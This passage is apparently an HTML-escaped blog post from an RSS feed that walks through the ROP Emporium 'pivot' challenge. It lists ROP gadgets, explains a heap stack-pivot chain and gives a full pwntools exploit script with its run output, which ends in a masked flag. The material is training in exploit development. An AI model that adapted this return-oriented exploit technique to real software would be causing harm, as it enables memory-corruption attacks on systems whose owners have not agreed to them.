0x0000000000400a2c: or eax, dword ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; call 0x800; mov eax, 0; leave; ret;
0x0000000000400b6c: pop r12; pop r13; pop r14; pop r15; ret;
0x0000000000400b6e: pop r13; pop r14; pop r15; ret;
0x0000000000400b70: pop r14; pop r15; ret;
0x0000000000400b72: pop r15; ret;
0x0000000000400b00: pop rax; ret;
0x00000000004008ef: pop rbp; mov edi, 0x602078; jmp rax;
0x0000000000400b6b: pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
0x0000000000400b6f: pop rbp; pop r14; pop r15; ret;
0x0000000000400900: pop rbp; ret;
0x0000000000400b73: pop rdi; ret;
0x0000000000400b71: pop rsi; pop r15; ret;
0x0000000000400b6d: pop rsp; pop r13; pop r14; pop r15; ret;
0x000000000040098a: push rbp; mov rbp, rsp; call rax;
0x0000000000400aca: ret 0x2015;
0x0000000000400987: sal byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rcx + rsi*8 + 0x55&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, 0x48; mov ebp, esp; call rax;
0x0000000000400b85: sub esp, 8; add rsp, 8; ret;
0x0000000000400b84: sub rsp, 8; add rsp, 8; ret;
0x00000000004008fa: test byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; pop rbp; ret;
0x00000000004008eb: test eax, eax; je 0x900; pop rbp; mov edi, 0x602078; jmp rax;
0x0000000000400939: test eax, eax; je 0x948; pop rbp; mov edi, 0x602078; jmp rax;
0x0000000000400986: test eax, eax; je 0x97b; push rbp; mov rbp, rsp; call rax;
0x00000000004008ea: test rax, rax; je 0x900; pop rbp; mov edi, 0x602078; jmp rax;
0x0000000000400938: test rax, rax; je 0x948; pop rbp; mov edi, 0x602078; jmp rax;
0x0000000000400985: test rax, rax; je 0x97b; push rbp; mov rbp, rsp; call rax;
0x0000000000400b03: xchg eax, esp; ret;
0x0000000000400b02: xchg rax, rsp; ret;
0x0000000000400989: int1; push rbp; mov rbp, rsp; call rax;
0x0000000000400a39: leave; ret;
0x0000000000400adf: nop; leave; ret;
0x00000000004007c9: ret;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can use these gadgets:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;pop &lt;code&gt;rax&lt;/code&gt; to get &lt;code&gt;foothold_function&lt;/code&gt; got address into it: &lt;code&gt;0x0000000000400b00: pop rax; ret;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Move the actual value, which is &lt;code&gt;foothold_function&lt;/code&gt; address into &lt;code&gt;rax&lt;/code&gt;: &lt;code&gt;0x0000000000400b05: mov rax, qword ptr [rax]; ret;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;pop &lt;code&gt;rbp&lt;/code&gt; to get our offset (&lt;code&gt;0x14e&lt;/code&gt;) into it: &lt;code&gt;0x0000000000400900: pop rbp; ret;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;add &lt;code&gt;rbp&lt;/code&gt; to &lt;code&gt;rax&lt;/code&gt;: &lt;code&gt;0x0000000000400b09: add rax, rbp; ret;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;call the function: &lt;code&gt;0x000000000040098e: call rax;&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;After that, for our buffer overflow, we can again use the &lt;code&gt;pop rax&lt;/code&gt; gadget to get the heap address (which we get from the binary output) into it, and then swap &lt;code&gt;rsp&lt;/code&gt; and &lt;code&gt;rax&lt;/code&gt; (&lt;code&gt;0x0000000000400b02: xchg rax, rsp; ret;&lt;/code&gt;) so we&amp;rsquo;ll get our pivot - the &lt;code&gt;rsp&lt;/code&gt; will point to the heap memory!&lt;/p&gt;
&lt;h3 id=&#34;technical-chain&#34;&gt;Technical Chain&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Call &lt;code&gt;foothold_function&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Load effective address of &lt;code&gt;foothold@got&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Add &lt;code&gt;0x14E&lt;/code&gt; to that register&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Return to the address in that register&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Calculate &lt;code&gt;ret2win&lt;/code&gt; address and return to it&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Stack chain:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;xchg rax, rsp; ret;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;pop rax; ret&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;LEAKED HEAP ADDRESS&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Heap ROP chain:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;0x0000000000400850&lt;/code&gt; (foothold plt)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;pop rax; ret;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;0x000000602048&lt;/code&gt; (foothold got)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;pop rbp; ret;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;0x14E&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;add rax, rbp; ret;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Load effective address of &lt;code&gt;rax&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;call rax&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;

ret2win_offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0000000000000abe&lt;/span&gt;
foothold_offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0000000000000970&lt;/span&gt;
add_offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ret2win_offset &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; foothold_offset
foothold_plt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0000000000400850&lt;/span&gt;
foothold_got &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x000000602048&lt;/span&gt;

xchg_rax &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x000400b02&lt;/span&gt;
pop_rax &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0000000000400b00&lt;/span&gt;
add_rax_rbp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0000000000400b09&lt;/span&gt;
pop_rbp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0000000000400900&lt;/span&gt;
load_rax &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x0000000000400b05&lt;/span&gt;
call_rax &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x000000000040098e&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;exploit&lt;/span&gt;():
    p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./pivot&amp;#34;&lt;/span&gt;)
    raw_input(str(p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;proc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pid))


    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pivot: 0x&amp;#34;&lt;/span&gt;)
    addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;), &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
    log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;address received: 0x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; addr)

    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvrepeat(&lt;span style=&#34;color:#ae81ff&#34;&gt;0.2&lt;/span&gt;)
    &lt;span style=&#34;color:#75715e&#34;&gt;# stack pivot in heap&lt;/span&gt;
    stack_pivot &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(foothold_plt)
    stack_pivot &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(pop_rax)
    stack_pivot &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(foothold_got)
    stack_pivot &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(load_rax)
    stack_pivot &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(pop_rbp)
    stack_pivot &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(add_offset)
    stack_pivot &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(add_rax_rbp)
    stack_pivot &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(call_rax)

    log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sending heap data for the stack pivot&amp;#34;&lt;/span&gt;)
    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(stack_pivot)
    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvrepeat(&lt;span style=&#34;color:#ae81ff&#34;&gt;0.2&lt;/span&gt;)

    log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sending first bof - stack pivoting&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#75715e&#34;&gt;# stack overflow, return to stack pivot&lt;/span&gt;
    stack_chain &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(pop_rax)
    stack_chain &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(addr)
    stack_chain &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(xchg_rax)
    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; stack_chain)
    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so&amp;#34;&lt;/span&gt;)
    log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;success( p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvall())


&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;:
    exploit()

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;adamgold@adamgold-VirtualBox:~/Desktop/ctfs/pivot$ python exp.py
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Starting local process &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./pivot&amp;#39;&lt;/span&gt;: pid &lt;span style=&#34;color:#ae81ff&#34;&gt;13106&lt;/span&gt;
&lt;span style=&#34;color:#ae81ff&#34;&gt;13106&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; address received: 0x7f2367d85f10
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; sending heap data &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; the stack pivot
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; sending first bof - stack pivoting
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Receiving all data: Done &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;33B&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Process &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./pivot&amp;#39;&lt;/span&gt; stopped with exit code &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;pid 13106&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; ROPE&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;********&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
        
        </description>
    </item>
    
  </channel>
</rss>